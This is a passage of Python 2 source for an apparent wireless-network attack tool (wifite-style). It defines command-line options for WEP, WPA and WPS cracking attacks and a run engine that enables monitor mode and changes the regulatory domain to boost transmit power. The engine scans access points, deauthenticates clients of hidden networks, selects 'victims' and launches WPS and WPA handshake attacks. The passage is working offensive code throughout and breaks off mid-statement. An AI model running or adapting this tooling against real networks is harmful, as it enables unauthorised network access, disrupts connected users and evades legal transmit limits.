wpa_group.add_argument('--wpat', help='Time to wait for WPA attack to complete (seconds).', action='store',\n                               dest='wpat')\n        wpa_group.add_argument('-wpat', help=argparse.SUPPRESS, action='store', dest='wpat')\n        wpa_group.add_argument('--wpadt', help='Time to wait between sending deauth packets (seconds).', action='store',\n                               dest='wpadt')\n        wpa_group.add_argument('-wpadt', help=argparse.SUPPRESS, action='store', dest='wpadt')\n        wpa_group.add_argument('--strip', help='Strip handshake using tshark or pyrit.', default=False,\n                               action='store_true', dest='strip')\n        wpa_group.add_argument('-strip', help=argparse.SUPPRESS, default=False, action='store_true', dest='strip')\n        wpa_group.add_argument('--crack', help='Crack WPA handshakes using [dic] wordlist file.', action='store_true',\n                               dest='crack')\n        wpa_group.add_argument('-crack', help=argparse.SUPPRESS, action='store_true', dest='crack')\n        wpa_group.add_argument('--dict', help='Specificy dictionary to use when cracking WPA.', action='store',\n                               dest='dic')\n        wpa_group.add_argument('-dict', help=argparse.SUPPRESS, action='store', dest='dic')\n        wpa_group.add_argument('--aircrack', help='Verify handshake using aircrack.', default=False,\n                               action='store_true', dest='aircrack')\n        wpa_group.add_argument('-aircrack', help=argparse.SUPPRESS, default=False, action='store_true', dest='aircrack')\n        wpa_group.add_argument('--pyrit', help='Verify handshake using pyrit.', default=False, action='store_true',\n                               dest='pyrit')\n        wpa_group.add_argument('-pyrit', help=argparse.SUPPRESS, default=False, action='store_true', dest='pyrit')\n        wpa_group.add_argument('--tshark', help='Verify handshake using tshark.', default=False, action='store_true',\n                               dest='tshark')\n        wpa_group.add_argument('-tshark', help=argparse.SUPPRESS, default=False, action='store_true', dest='tshark')\n        wpa_group.add_argument('--cowpatty', help='Verify handshake using cowpatty.', default=False,\n                               action='store_true', dest='cowpatty')\n        wpa_group.add_argument('-cowpatty', help=argparse.SUPPRESS, default=False, action='store_true', dest='cowpatty')\n        # set WEP commands\n        wep_group = option_parser.add_argument_group('WEP')\n        wep_group.add_argument('--wep', help='Only target WEP networks.', default=False, action='store_true',\n                               dest='wep')\n        wep_group.add_argument('-wep', help=argparse.SUPPRESS, default=False, action='store_true', dest='wep')\n        wep_group.add_argument('--pps', help='Set the number of packets per second to inject.', action='store',\n                               dest='pps')\n        wep_group.add_argument('-pps', help=argparse.SUPPRESS, action='store', dest='pps')\n        wep_group.add_argument('--wept', help='Sec to wait for each attack, 0 implies endless.', action='store',\n                               dest='wept')\n        wep_group.add_argument('-wept', help=argparse.SUPPRESS, action='store', dest='wept')\n        wep_group.add_argument('--chopchop', help='Use chopchop attack.', default=False, action='store_true',\n                               dest='chopchop')\n        wep_group.add_argument('-chopchop', help=argparse.SUPPRESS, default=False, action='store_true', dest='chopchop')\n        wep_group.add_argument('--arpreplay', help='Use arpreplay attack.', default=False, action='store_true',\n                               dest='arpreplay')\n        wep_group.add_argument('-arpreplay', help=argparse.SUPPRESS, default=False, action='store_true',\n                               dest='arpreplay')\n        wep_group.add_argument('--fragment', help='Use fragmentation attack.', default=False, action='store_true',\n                               dest='fragment')\n        wep_group.add_argument('-fragment', help=argparse.SUPPRESS, default=False, action='store_true', dest='fragment')\n        wep_group.add_argument('--caffelatte', help='Use caffe-latte attack.', default=False, action='store_true',\n                               dest='caffeelatte')\n        wep_group.add_argument('-caffelatte', help=argparse.SUPPRESS, default=False, action='store_true',\n                               dest='caffeelatte')\n        wep_group.add_argument('--p0841', help='Use P0842 attack.', default=False, action='store_true', dest='p0841')\n        wep_group.add_argument('-p0841', help=argparse.SUPPRESS, default=False, action='store_true', dest='p0841')\n        wep_group.add_argument('--hirte', help='Use hirte attack.', default=False, action='store_true', dest='hirte')\n        wep_group.add_argument('-hirte', help=argparse.SUPPRESS, default=False, action='store_true', dest='hirte')\n        wep_group.add_argument('--nofakeauth', help='Stop attack if fake authentication fails.', default=False,\n                               action='store_true', dest='fakeauth')\n        wep_group.add_argument('-nofakeauth', help=argparse.SUPPRESS, default=False, action='store_true',\n                               dest='fakeauth')\n        wep_group.add_argument('--wepca', help='Start cracking when number of IVs surpass [n].', action='store',\n                               dest='wepca')\n        wep_group.add_argument('-wepca', help=argparse.SUPPRESS, action='store', dest='wepca')\n        wep_group.add_argument('--wepsave', help='Save a copy of .cap files to this directory.', default=None,\n                               action='store', dest='wepsave')\n        wep_group.add_argument('-wepsave', help=argparse.SUPPRESS, default=None, action='store', dest='wepsave')\n        # set WPS commands\n        wps_group = option_parser.add_argument_group('WPS')\n        wps_group.add_argument('--wps', help='Only target WPS networks.', default=False, action='store_true',\n                               dest='wps')\n        wps_group.add_argument('-wps', help=argparse.SUPPRESS, default=False, action='store_true', dest='wps')\n        wps_group.add_argument('--pixie', help='Only use the WPS PixieDust attack', default=False, action='store_true', dest='pixie')\n        wps_group.add_argument('--wpst', help='Max wait for new retry before giving up (0: never).', action='store',\n                               dest='wpst')\n        wps_group.add_argument('-wpst', help=argparse.SUPPRESS, action='store', dest='wpst')\n        wps_group.add_argument('--wpsratio', help='Min ratio of successful PIN attempts/total retries.', action='store',\n                               dest='wpsratio')\n        wps_group.add_argument('-wpsratio', help=argparse.SUPPRESS, action='store', dest='wpsratio')\n        wps_group.add_argument('--wpsretry', help='Max number of retries for same PIN before giving up.',\n                               action='store', dest='wpsretry')\n        wps_group.add_argument('-wpsretry', help=argparse.SUPPRESS, action='store', dest='wpsretry')\n\n        return option_parser\n\n\nclass RunEngine:\n    def __init__(self, run_config):\n        self.RUN_CONFIG = run_config\n        self.RUN_CONFIG.RUN_ENGINE = self\n\n    def initial_check(self):\n        \"\"\"\n            Ensures required programs are installed.\n        \"\"\"\n        airs = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'packetforge-ng']\n        for air in airs:\n            if program_exists(air): continue\n            print R + ' [!]' + O + ' required program not found: %s' % (R + air + W)\n            print R + ' [!]' + O + ' this program is bundled with the aircrack-ng suite:' + W\n            print R + ' [!]' + O + '        ' + C + 'http://www.aircrack-ng.org/' + W\n            print R + ' [!]' + O + ' or: ' + W + 'sudo apt-get install aircrack-ng\\n' + W\n            self.RUN_CONFIG.exit_gracefully(1)\n\n        if not program_exists('iw'):\n            print R + ' [!]' + O + ' airmon-ng requires the program %s\\n' % (R + 'iw' + W)\n            self.RUN_CONFIG.exit_gracefully(1)\n\n        if not program_exists('iwconfig'):\n            print R + ' [!]' + O + ' wifite requires the program %s\\n' % (R + 'iwconfig' + W)\n            self.RUN_CONFIG.exit_gracefully(1)\n\n        if not program_exists('ifconfig'):\n            print R + ' [!]' + O + ' wifite requires the program %s\\n' % (R + 'ifconfig' + W)\n            self.RUN_CONFIG.exit_gracefully(1)\n\n        printed = False\n        # Check reaver\n        if not program_exists('reaver'):\n            printed = True\n            print R + ' [!]' + O + ' the program ' + R + 'reaver' + O + ' is required for WPS attacks' + W\n            print R + '    ' + O + '   available at ' + C + 'http://code.google.com/p/reaver-wps' + W\n            self.RUN_CONFIG.WPS_DISABLE = True\n\n        if not program_exists('tshark'):\n            printed = True\n            print R + ' [!]' + O + ' the program ' + R + 'tshark' + O + ' was not found' + W\n            print R + ' [!]' + O + ' please install tshark: https://www.wireshark.org/#download' + W\n            self.RUN_CONFIG.WPS_DISABLE = True\n\n        # Check handshake-checking apps\n        recs = ['pyrit', 'cowpatty']\n        for rec in recs:\n            if program_exists(rec): continue\n            printed = True\n            print R + ' [!]' + O + ' the program %s is not required, but is recommended%s' % (R + rec + O, W)\n        if printed: print ''\n\n    def enable_monitor_mode(self, iface):\n        \"\"\"\n            First attempts to anonymize the MAC if requested; MACs cannot\n            be anonymized if they're already in monitor mode.\n            Uses airmon-ng to put a device into Monitor Mode.\n            Then uses the get_iface() method to retrieve the new interface's name.\n            Sets global variable IFACE_TO_TAKE_DOWN as well.\n            Returns the name of the interface in monitor mode.\n        \"\"\"\n        mac_anonymize(iface)\n        print GR + ' [+]' + W + ' enabling monitor mode on %s...' % (G + iface + W),\n        stdout.flush()\n        call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)\n        print 'done'\n        self.RUN_CONFIG.WIRELESS_IFACE = ''  # remove this reference as we've started its monitoring counterpart\n        self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = self.get_iface()\n        if self.RUN_CONFIG.TX_POWER > 0:\n            print GR + ' [+]' + W + ' setting Tx power to %s%s%s...' % (G, self.RUN_CONFIG.TX_POWER, W),\n            call(['iw', 'reg', 'set', 'BO'], stdout=OUTLOG, stderr=ERRLOG)\n            call(['iwconfig', iface, 'txpower', self.RUN_CONFIG.TX_POWER], stdout=OUTLOG, stderr=ERRLOG)\n            print 'done'\n        return self.RUN_CONFIG.IFACE_TO_TAKE_DOWN\n\n    def disable_monitor_mode(self):\n        \"\"\"\n            The program may have enabled monitor mode on a wireless interface.\n            We want to disable this before we exit, so we will do that.\n        \"\"\"\n        if self.RUN_CONFIG.IFACE_TO_TAKE_DOWN == '': return\n        print GR + ' [+]' + W + ' disabling monitor mode on %s...' % (G + self.RUN_CONFIG.IFACE_TO_TAKE_DOWN + W),\n        stdout.flush()\n        call(['airmon-ng', 'stop', self.RUN_CONFIG.IFACE_TO_TAKE_DOWN], stdout=DN, stderr=DN)\n        print 'done'\n\n    def rtl8187_fix(self, iface):\n        \"\"\"\n            Attempts to solve \"Unknown error 132\" common with RTL8187 devices.\n            Puts down interface, unloads/reloads driver module, then puts iface back up.\n            Returns True if fix was attempted, False otherwise.\n        \"\"\"\n        # Check if current interface is using the RTL8187 chipset\n        proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)\n        proc_airmon.wait()\n        using_rtl8187 = False\n        for line in proc_airmon.communicate()[0].split():\n            line = line.upper()\n            if line.strip() == '' or line.startswith('INTERFACE'): continue\n            if line.find(iface.upper()) and line.find('RTL8187') != -1: using_rtl8187 = True\n\n        if not using_rtl8187:\n            # Display error message and exit\n            print R + ' [!]' + O + ' unable to generate airodump-ng CSV file' + W\n            print R + ' [!]' + O + ' you may want to disconnect/reconnect your wifi device' + W\n            self.RUN_CONFIG.exit_gracefully(1)\n\n        print O + \" [!]\" + W + \" attempting \" + O + \"RTL8187 'Unknown Error 132'\" + W + \" fix...\"\n\n        original_iface = iface\n        # Take device out of monitor mode\n        airmon = Popen(['airmon-ng', 'stop', iface], stdout=PIPE, stderr=DN)\n        airmon.wait()\n        for line in airmon.communicate()[0].split('\\n'):\n            if line.strip() == '' or \\\n                    line.startswith(\"Interface\") or \\\n                            line.find('(removed)') != -1:\n                continue\n            original_iface = line.split()[0]  # line[:line.find('\\t')]\n\n        # Remove drive modules, block/unblock ifaces, probe new modules.\n        print_and_exec(['ifconfig', original_iface, 'down'])\n        print_and_exec(['rmmod', 'rtl8187'])\n        print_and_exec(['rfkill', 'block', 'all'])\n        print_and_exec(['rfkill', 'unblock', 'all'])\n        print_and_exec(['modprobe', 'rtl8187'])\n        print_and_exec(['ifconfig', original_iface, 'up'])\n        print_and_exec(['airmon-ng', 'start', original_iface])\n\n        print '\\r                                                        \\r',\n        print O + ' [!] ' + W + 'restarting scan...\\n'\n\n        return True\n\n    def get_iface(self):\n        \"\"\"\n            Get the wireless interface in monitor mode.\n            Defaults to only device in monitor mode if found.\n            Otherwise, enumerates list of possible wifi devices\n            and asks user to select one to put into monitor mode (if multiple).\n            Uses airmon-ng to put device in monitor mode if needed.\n            Returns the name (string) of the interface chosen in monitor mode.\n        \"\"\"\n        if not self.RUN_CONFIG.PRINTED_SCANNING:\n            print GR + ' [+]' + W + ' scanning for wireless devices...'\n            self.RUN_CONFIG.PRINTED_SCANNING = True\n\n        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)\n        iface = ''\n        monitors = []\n        adapters = []\n        for line in proc.communicate()[0].split('\\n'):\n            if len(line) == 0: continue\n            if ord(line[0]) != 32:  # Doesn't start with space\n                iface = line[:line.find(' ')]  # is the interface\n            if line.find('Mode:Monitor') != -1:\n                monitors.append(iface)\n            else:\n                adapters.append(iface)\n\n        if self.RUN_CONFIG.WIRELESS_IFACE != '':\n            if monitors.count(self.RUN_CONFIG.WIRELESS_IFACE):\n                return self.RUN_CONFIG.WIRELESS_IFACE\n            else:\n                if self.RUN_CONFIG.WIRELESS_IFACE in adapters:\n                    # valid adapter, enable monitor mode\n                    print R + ' [!]' + O + ' could not find wireless interface %s in monitor mode' % (\n                    R + '\"' + R + self.RUN_CONFIG.WIRELESS_IFACE + '\"' + O)\n                    return self.enable_monitor_mode(self.RUN_CONFIG.WIRELESS_IFACE)\n                else:\n                    # couldnt find the requested adapter\n                    print R + ' [!]' + O + ' could not find wireless interface %s' % (\n                    '\"' + R + self.RUN_CONFIG.WIRELESS_IFACE + O + '\"' + W)\n                    self.RUN_CONFIG.exit_gracefully(0)\n\n        if len(monitors) == 1:\n            return monitors[0]  # Default to only device in monitor mode\n        elif len(monitors) > 1:\n            print GR + \" [+]\" + W + \" interfaces in \" + G + \"monitor mode:\" + W\n            for i, monitor in enumerate(monitors):\n                print \"  %s. %s\" % (G + str(i + 1) + W, G + monitor + W)\n            ri = raw_input(\"%s [+]%s select %snumber%s of interface to use for capturing (%s1-%d%s): %s\" % \\\n                           (GR, W, G, W, G, len(monitors), W, G))\n            while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):\n                ri = raw_input(\"%s [+]%s select number of interface to use for capturing (%s1-%d%s): %s\" % \\\n                               (GR, W, G, len(monitors), W, G))\n            i = int(ri)\n            return monitors[i - 1]\n\n        proc = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)\n        for line in proc.communicate()[0].split('\\n'):\n            if len(line) == 0 or line.startswith('Interface') or line.startswith('PHY'): continue\n            monitors.append(line)\n\n        if len(monitors) == 0:\n            print R + ' [!]' + O + \" no wireless interfaces were found.\" + W\n            print R + ' [!]' + O + \" you need to plug in a wifi device or install drivers.\\n\" + W\n            self.RUN_CONFIG.exit_gracefully(0)\n        elif self.RUN_CONFIG.WIRELESS_IFACE != '' and monitors.count(self.RUN_CONFIG.WIRELESS_IFACE) > 0:\n            monitor = monitors[0][:monitors[0].find('\\t')]\n            return self.enable_monitor_mode(monitor)\n\n        elif len(monitors) == 1:\n            monitor = monitors[0][:monitors[0].find('\\t')]\n            if monitor.startswith('phy'): monitor = monitors[0].split()[1]\n            return self.enable_monitor_mode(monitor)\n\n        print GR + \" [+]\" + W + \" available wireless devices:\"\n        for i, monitor in enumerate(monitors):\n            print \"  %s%d%s. %s\" % (G, i + 1, W, monitor)\n\n        ri = raw_input(\n            GR + \" [+]\" + W + \" select number of device to put into monitor mode (%s1-%d%s): \" % (G, len(monitors), W))\n        while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):\n            ri = raw_input(\" [+] select number of device to put into monitor mode (%s1-%d%s): \" % (G, len(monitors), W))\n        i = int(ri)\n        monitor = monitors[i - 1][:monitors[i - 1].find('\\t')]\n\n        return self.enable_monitor_mode(monitor)\n\n    def scan(self, channel=0, iface='', tried_rtl8187_fix=False):\n        \"\"\"\n            Scans for access points. Asks user to select target(s).\n                \"channel\" - the channel to scan on, 0 scans all channels.\n                \"iface\"   - the interface to scan on. must be a real interface.\n                \"tried_rtl8187_fix\" - We have already attempted to fix \"Unknown error 132\"\n            Returns list of selected targets and list of clients.\n        \"\"\"\n        airodump_file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wifite')\n        csv_file = airodump_file_prefix + '-01.csv'\n        cap_file = airodump_file_prefix + '-01.cap'\n        remove_airodump_files(airodump_file_prefix)\n\n        command = ['airodump-ng',\n                   '-a',  # only show associated clients\n                   '--write-interval', '1', # Write every second\n                   '-w', airodump_file_prefix]  # output file\n        if channel != 0:\n            command.append('-c')\n            command.append(str(channel))\n        command.append(iface)\n\n        proc = Popen(command, stdout=DN, stderr=DN)\n\n        time_started = time.time()\n        print GR + ' [+] ' + G + 'initializing scan' + W + ' (' + G + iface + W + '), updates at 1 sec intervals, ' + G + 'CTRL+C' + W + ' when ready.'\n        (targets, clients) = ([], [])\n        try:\n            deauth_sent = 0.0\n            old_targets = []\n            stop_scanning = False\n            while True:\n                time.sleep(0.3)\n                if not os.path.exists(csv_file) and time.time() - time_started > 1.0:\n                    print R + '\\n [!] ERROR!' + W\n                    # RTL8187 Unknown Error 132 FIX\n                    if proc.poll() is not None:  # Check if process has finished\n                        proc = Popen(['airodump-ng', iface], stdout=DN, stderr=PIPE)\n                        if not tried_rtl8187_fix and proc.communicate()[1].find('failed: Unknown error 132') != -1:\n                            send_interrupt(proc)\n                            if self.rtl8187_fix(iface):\n                                return self.scan(channel=channel, iface=iface, tried_rtl8187_fix=True)\n                    print R + ' [!]' + O + ' wifite is unable to generate airodump-ng output files' + W\n                    print R + ' [!]' + O + ' you may want to disconnect/reconnect your wifi device' + W\n                    self.RUN_CONFIG.exit_gracefully(1)\n\n                (targets, clients) = self.parse_csv(csv_file)\n\n                # Remove any already cracked networks if configured to do so\n                if self.RUN_CONFIG.SHOW_ALREADY_CRACKED == False:\n                    index = 0\n                    while index < len(targets):\n                        already = False\n                        for cracked in self.RUN_CONFIG.CRACKED_TARGETS:\n                            if targets[index].ssid.lower() == cracked.ssid.lower():\n                                already = True\n                            if targets[index].bssid.lower() == cracked.bssid.lower():\n                                already = True\n                        if already == True:\n                            targets.pop(index)\n                            index -= 1\n                        index += 1\n\n                # If we are targeting a specific ESSID/BSSID, skip the scan once we find it.\n                if self.RUN_CONFIG.TARGET_ESSID != '':\n                    for t in targets:\n                        if t.ssid.lower() == self.RUN_CONFIG.TARGET_ESSID.lower():\n                            send_interrupt(proc)\n                            try:\n                                os.kill(proc.pid, SIGTERM)\n                            except OSError:\n                                pass\n                            except UnboundLocalError:\n                                pass\n                            targets = [t]\n                            stop_scanning = True\n                            break\n                if self.RUN_CONFIG.TARGET_BSSID != '':\n                    for t in targets:\n                        if t.bssid.lower() == self.RUN_CONFIG.TARGET_BSSID.lower():\n                            send_interrupt(proc)\n                            try:\n                                os.kill(proc.pid, SIGTERM)\n                            except OSError:\n                                pass\n                            except UnboundLocalError:\n                                pass\n                            targets = [t]\n                            stop_scanning = True\n                            break\n\n                # If user has chosen to target all access points, wait 20 seconds, then return all\n                if self.RUN_CONFIG.ATTACK_ALL_TARGETS and time.time() - time_started > 10:\n                    print GR + '\\n [+]' + W + ' auto-targeted %s%d%s access point%s' % (\n                    G, len(targets), W, '' if len(targets) == 1 else 's')\n                    stop_scanning = True\n\n                if self.RUN_CONFIG.ATTACK_MIN_POWER > 0 and time.time() - time_started > 10:\n                    # Remove targets with power < threshold\n                    i = 0\n                    before_count = len(targets)\n                    while i < len(targets):\n                        if targets[i].power < self.RUN_CONFIG.ATTACK_MIN_POWER:\n                            targets.pop(i)\n                        else:\n                            i += 1\n                    print GR + '\\n [+]' + W + ' removed %s targets with power < %ddB, %s remain' % \\\n                                              (G + str(before_count - len(targets)) + W,\n                                               self.RUN_CONFIG.ATTACK_MIN_POWER, G + str(len(targets)) + W)\n                    stop_scanning = True\n\n                if stop_scanning: break\n\n                # If there are unknown SSIDs, send deauths to them.\n                if self.RUN_CONFIG.SEND_DEAUTHS and channel != 0 and time.time() - deauth_sent > 5:\n                    deauth_sent = time.time()\n                    for t in targets:\n                        if t.ssid == '' or '\\x00' in t.ssid or '\\\\x00' in t.ssid:\n                            print \"\\r %s deauthing hidden access point (%s)               \\r\" % \\\n                                  (GR + sec_to_hms(time.time() - time_started) + W, G + t.bssid + W),\n                            stdout.flush()\n                            # Time to deauth\n                            cmd = ['aireplay-ng',\n                                   '--ignore-negative-one',\n                                   '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),\n                                   '-a', t.bssid]\n                            for c in clients:\n                                if c.station == t.bssid:\n                                    cmd.append('-c')\n                                    cmd.append(c.bssid)\n                                    break\n                            cmd.append(iface)\n                            proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)\n                            proc_aireplay.wait()\n                            time.sleep(0.5)\n                        else:\n                            for ot in old_targets:\n                                if ot.ssid == '' and ot.bssid == t.bssid:\n                                    print '\\r %s successfully decloaked \"%s\"                     ' % \\\n                                          (GR + sec_to_hms(time.time() - time_started) + W, G + t.ssid + W)\n\n                    old_targets = targets[:]\n                if self.RUN_CONFIG.VERBOSE_APS and len(targets) > 0:\n                    targets = sorted(targets, key=lambda t: t.power, reverse=True)\n                    if not self.RUN_CONFIG.WPS_DISABLE:\n                        wps_check_targets(targets, cap_file, verbose=False)\n\n                    os.system('clear')\n                    print GR + '\\n [+] ' + G + 'scanning' + W + ' (' + G + iface + W + '), updates at 1 sec intervals, ' + G + 'CTRL+C' + W + ' when ready.\\n'\n                    print \"   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT\" % (\n                    'BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')\n                    print '   --- --------------------  %s--  ----  -----  ----  ------' % (\n                    '-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')\n                    for i, target in enumerate(targets):\n                        print \"   %s%2d%s \" % (G, i + 1, W),\n                        # SSID\n                        if target.ssid == '' or '\\x00' in target.ssid or '\\\\x00' in target.ssid:\n                            p = O + '(' + target.bssid + ')' + GR + ' ' + W\n                            print '%s' % p.ljust(20),\n                        elif len(target.ssid) <= 20:\n                            print \"%s\" % C + target.ssid.ljust(20) + W,\n                        else:\n                            print \"%s\" % C + target.ssid[0:17] + '...' + W,\n                        # BSSID\n                        if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:\n                            print O, target.bssid + W,\n                        # Channel\n                        print G + target.channel.rjust(3), W,\n                        # Encryption\n                        if target.encryption.find(\"WEP\") != -1:\n                            print G,\n                        else:\n                            print O,\n                        print \"\\b%3s\" % target.encryption.strip().ljust(4) + W,\n                        # Power\n                        if target.power >= 55:\n                            col = G\n                        elif target.power >= 40:\n                            col = O\n                        else:\n                            col = R\n                        print \"%s%3ddb%s\" % (col, target.power, W),\n                        # WPS\n                        if self.RUN_CONFIG.WPS_DISABLE:\n                            print \"  %3s\" % (O + 'n/a' + W),\n                        else:\n                            print \"  %3s\" % (G + 'wps' + W if target.wps else R + ' no' + W),\n                        # Clients\n                        client_text = ''\n                        for c in clients:\n                            if c.station == target.bssid:\n                                if client_text == '':\n                                    client_text = 'client'\n                                elif client_text[-1] != \"s\":\n                                    client_text += \"s\"\n                        if client_text != '':\n                            print '  %s' % (G + client_text + W)\n                        else:\n                            print ''\n                    print ''\n                print ' %s %s wireless networks. %s target%s and %s client%s found   \\r' % (\n                    GR + sec_to_hms(time.time() - time_started) + W, G + 'scanning' + W,\n                    G + str(len(targets)) + W, '' if len(targets) == 1 else 's',\n                    G + str(len(clients)) + W, '' if len(clients) == 1 else 's'),\n\n                stdout.flush()\n        except KeyboardInterrupt:\n            pass\n        print ''\n\n        send_interrupt(proc)\n        try:\n            os.kill(proc.pid, SIGTERM)\n        except OSError:\n            pass\n        except UnboundLocalError:\n            pass\n\n        # Use \"tshark\" program to check for WPS compatibility\n        if not self.RUN_CONFIG.WPS_DISABLE:\n            wps_check_targets(targets, cap_file)\n\n        remove_airodump_files(airodump_file_prefix)\n\n        if stop_scanning:\n            return (targets, clients)\n        print ''\n\n        if len(targets) == 0:\n            print R + ' [!]' + O + ' no targets found!' + W\n            print R + ' [!]' + O + ' you may need to wait for targets to show up.' + W\n            print ''\n            self.RUN_CONFIG.exit_gracefully(1)\n\n        if self.RUN_CONFIG.VERBOSE_APS: os.system('clear')\n\n        # Sort by Power\n        targets = sorted(targets, key=lambda t: t.power, reverse=True)\n\n        victims = []\n        print \"   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT\" % (\n        'BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')\n        print '   --- --------------------  %s--  ----  -----  ----  ------' % (\n        '-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else '')\n        for i, target in enumerate(targets):\n            print \"   %s%2d%s \" % (G, i + 1, W),\n            # SSID\n            if target.ssid == '' or '\\x00' in target.ssid or '\\\\x00' in target.ssid:\n                p = O + '(' + target.bssid + ')' + GR + ' ' + W\n                print '%s' % p.ljust(20),\n            elif len(target.ssid) <= 20:\n                print \"%s\" % C + target.ssid.ljust(20) + W,\n            else:\n                print \"%s\" % C + target.ssid[0:17] + '...' + W,\n            # BSSID\n            if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:\n                print O, target.bssid + W,\n            # Channel\n            print G + target.channel.rjust(3), W,\n            # Encryption\n            if target.encryption.find(\"WEP\") != -1:\n                print G,\n            else:\n                print O,\n            print \"\\b%3s\" % target.encryption.strip().ljust(4) + W,\n            # Power\n            if target.power >= 55:\n                col = G\n            elif target.power >= 40:\n                col = O\n            else:\n                col = R\n            print \"%s%3ddb%s\" % (col, target.power, W),\n            # WPS\n            if self.RUN_CONFIG.WPS_DISABLE:\n                print \"  %3s\" % (O + 'n/a' + W),\n            else:\n                print \"  %3s\" % (G + 'wps' + W if target.wps else R + ' no' + W),\n            # Clients\n            client_text = ''\n            for c in clients:\n                if c.station == target.bssid:\n                    if client_text == '':\n                        client_text = 'client'\n                    elif client_text[-1] != \"s\":\n                        client_text += \"s\"\n            if client_text != '':\n                print '  %s' % (G + client_text + W)\n            else:\n                print ''\n\n        ri = raw_input(\n            GR + \"\\n [+]\" + W + \" select \" + G + \"target numbers\" + W + \" (\" + G + \"1-%s)\" % (str(len(targets)) + W) + \\\n            \" separated by commas, or '%s': \" % (G + 'all' + W))\n        if ri.strip().lower() == 'all':\n            victims = targets[:]\n        else:\n            for r in ri.split(','):\n                r = r.strip()\n                if r.find('-') != -1:\n                    (sx, sy) = r.split('-')\n                    if sx.isdigit() and sy.isdigit():\n                        x = int(sx)\n                        y = int(sy) + 1\n                        for v in xrange(x, y):\n                            victims.append(targets[v - 1])\n                elif not r.isdigit() and r.strip() != '':\n                    print O + \" [!]\" + R + \" not a number: %s \" % (O + r + W)\n                elif r != '':\n                    victims.append(targets[int(r) - 1])\n\n        if len(victims) == 0:\n            print O + '\\n [!] ' + R + 'no targets selected.\\n' + W\n            self.RUN_CONFIG.exit_gracefully(0)\n\n        print ''\n        print ' [+] %s%d%s target%s selected.' % (G, len(victims), W, '' if len(victims) == 1 else 's')\n\n        return (victims, clients)\n\n    def Start(self):\n        self.RUN_CONFIG.CreateTempFolder()\n        self.RUN_CONFIG.handle_args()\n        self.RUN_CONFIG.ConfirmRunningAsRoot()\n        self.RUN_CONFIG.ConfirmCorrectPlatform()\n\n        self.initial_check()  # Ensure required programs are installed.\n\n        # Use an interface already in monitor mode if it has been provided,\n        if self.RUN_CONFIG.MONITOR_IFACE != '':\n            iface = self.RUN_CONFIG.MONITOR_IFACE\n        else:\n            # The \"get_iface\" method anonymizes the MAC address (if needed)\n            # and puts the interface into monitor mode.\n            iface = self.get_iface()\n        self.RUN_CONFIG.THIS_MAC = get_mac_address(iface)  # Store current MAC address\n\n        (targets, clients) = self.scan(iface=iface, channel=self.RUN_CONFIG.TARGET_CHANNEL)\n\n        try:\n            index = 0\n            while index < len(targets):\n                target = targets[index]\n                # Check if we have already cracked this target\n                for already in RUN_CONFIG.CRACKED_TARGETS:\n                    if already.bssid == targets[index].bssid:\n                        if RUN_CONFIG.SHOW_ALREADY_CRACKED == True:\n                            print R + '\\n [!]' + O + ' you have already cracked this access point\\'s key!' + W\n                            print R + ' [!] %s' % (C + already.ssid + W + ': \"' + G + already.key + W + '\"')\n                            ri = raw_input(\n                                GR + ' [+] ' + W + 'do you want to crack this access point again? (' + G + 'y/' + O + 'n' + W + '): ')\n                            if ri.lower() == 'n':\n                                targets.pop(index)\n                                index -= 1\n                        else:\n                            targets.pop(index)\n                            index -= 1\n                        break\n\n                # Check if handshakes already exist, ask user whether to skip targets or save new handshakes\n                handshake_file = RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) \\\n                                 + '_' + target.bssid.replace(':', '-') + '.cap'\n                if os.path.exists(handshake_file):\n                    print R + '\\n [!] ' + O + 'you already have a handshake file for %s:' % (C + target.ssid + W)\n                    print '        %s\\n' % (G + handshake_file + W)\n                    print GR + ' [+]' + W + ' do you want to ' + G + '[s]kip' + W + ', ' + O + '[c]apture again' + W + ', or ' + R + '[o]verwrite' + W + '?'\n                    ri = 'x'\n                    while ri != 's' and ri != 'c' and ri != 'o':\n                        ri = raw_input(\n                            GR + ' [+] ' + W + 'enter ' + G + 's' + W + ', ' + O + 'c,' + W + ' or ' + R + 'o' + W + ': ' + G).lower()\n                    print W + \"\\b\",\n                    if ri == 's':\n                        targets.pop(index)\n                        index -= 1\n                    elif ri == 'o':\n                        remove_file(handshake_file)\n                        continue\n                index += 1\n\n\n        except KeyboardInterrupt:\n            print '\\n ' + R + '(^C)' + O + ' interrupted\\n'\n            self.RUN_CONFIG.exit_gracefully(0)\n\n        wpa_success = 0\n        wep_success = 0\n        wpa_total = 0\n        wep_total = 0\n\n        self.RUN_CONFIG.TARGETS_REMAINING = len(targets)\n        for t in targets:\n            self.RUN_CONFIG.TARGETS_REMAINING -= 1\n\n            # Build list of clients connected to target\n            ts_clients = []\n            for c in clients:\n                if c.station == t.bssid:\n                    ts_clients.append(c)\n\n            print ''\n            if t.encryption.find('WPA') != -1:\n                need_handshake = True\n                if not self.RUN_CONFIG.WPS_DISABLE and t.wps:\n                    wps_attack = WPSAttack(iface, t, self.RUN_CONFIG)\n                    need_handshake = not wps_attack.RunAttack()\n                    wpa_total += 1\n\n                if not need_handshake: wpa_success += 1\n                if self.RUN_CONFIG.TARGETS_REMAINING < 0: break\n\n                if not self.RUN_CONFIG.PIXIE and not self.RUN_CONFIG.WPA_DISABLE and need_handshake:\n                    wpa_total += 1\n                    wpa_attack = WPAAttack(iface, t, ts_clients, 